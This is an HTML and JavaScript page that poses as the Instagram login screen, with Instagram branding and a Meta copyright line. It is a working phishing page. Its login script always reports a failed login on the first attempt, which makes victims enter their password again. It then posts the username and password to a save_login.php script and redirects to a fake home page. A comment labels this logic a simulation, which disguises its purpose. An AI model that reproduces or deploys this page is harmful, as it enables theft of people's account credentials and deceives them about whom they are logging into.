<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
  <link rel="stylesheet" href="login.css">
  <title>Instagram Login Form</title>
  <style>
    .error-message {
      color: red;
      font-size: 12px;
      display: none;
    }
    .error-icon {
      display: inline-block;
      margin-right: 5px;
      font-size: 12px;
      color: red;
    }
    .error {
      border: 1px solid red;
    }
  </style>
</head>
<body>

  <div id="wrapper">
    <div class="container">
      <div class="phone-app-demo"></div>
      <div class="form-data">
        <form id="loginForm">
          <div class="logo">
            <img src="./images/logo.png" alt="logo">
          </div>
          <input type="text" id="username" placeholder="Phone number, username, or email">
          <span class="error-message" id="usernameError"><i class="fa fa-exclamation-circle error-icon"></i> Username is required.</span>
          <input type="password" id="password" placeholder="Password">
          <span class="error-message" id="passwordError"><i class="fa fa-exclamation-circle error-icon"></i> Password is required.</span>
          <span class="error-message" id="loginError"><i class="fa fa-exclamation-circle error-icon"></i> Incorrect username or password.</span>
          <button class="form-btn" type="button" onclick="login()">Log in</button>
          <span class="has-separator">Or</span>
          <a class="facebook-login" href="#">
            <i class="fab fa-facebook-square"></i> Log in with Facebook
          </a>
          <a class="password-reset" href="#">Forgot password?</a>
        </form>
        <div class="sign-up">
          Don't have an account? <a href="#">Sign up</a>
        </div>
        <div class="get-the-app">
          <span>Get the app.</span>
          <div class="badges">
            <img src="./images/app-store.png" alt="app-store badge">
            <img src="./images/google-play.png" alt="google-play badge">
          </div>
        </div>
      </div>
    </div>
    <footer>
      <div class="container">
        <nav class="footer-nav">
          <ul>
            <li><a href="#">About us</a></li>
            <li><a href="#">Support</a></li>
            <li><a href="#">Press</a></li>
            <li><a href="#">Api</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Directory</a></li>
            <li><a href="#">Profiles</a></li>
            <li><a href="#">Hashtags</a></li>
            <li><a href="#">Languages</a></li>
          </ul>
        </nav>
        <div class="copyright-notice">
          &copy; 2024 Meta
        </div>
      </div>
    </footer>
  </div>

  <script>
    var click_count=0;
    
    function login() {
        click_count+=1;
      var username = document.getElementById('username').value.trim();
      var password = document.getElementById('password').value.trim();
      

      // Reset previous errors
      document.getElementById('username').classList.remove('error');
      document.getElementById('password').classList.remove('error');
      document.getElementById('usernameError').style.display = 'none';
      document.getElementById('passwordError').style.display = 'none';
      document.getElementById('loginError').style.display = 'none';

      // Check if username and password are empty
      if (username === '') {
        document.getElementById('username').classList.add('error');
        document.getElementById('usernameError').style.display = 'inline';
        return;
      }
      if (password === '') {
        document.getElementById('password').classList.add('error');
        document.getElementById('passwordError').style.display = 'inline';
        return;
      }

      // Simulate login check (replace with actual logic)
      // For demonstration purposes, assume username is 'user' and password is 'password'
      if (click_count===1) {
        document.getElementById('loginError').style.display = 'inline';
        document.getElementById('username').value='';
        document.getElementById('password').value ='';
        return;
      }

      // Send data to PHP script using AJAX
      var xhr = new XMLHttpRequest();
xhr.open('POST', '/son/save_login.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
window.location.href = '/son/home.php';
// Prepare data and send the request
var data = 'username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
xhr.send(data);
setCookie('username', username, 2);



      // Reset input fields
      document.getElementById('username').value = '';
      document.getElementById('password').value = '';
    }

    function setCookie(name, value, days) {
    var expires = '';
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = '; expires=' + date.toUTCString();
    }
    document.cookie = name + '=' + (value || '') + expires + '; path=/';
}

  </script>

</body>
</html>
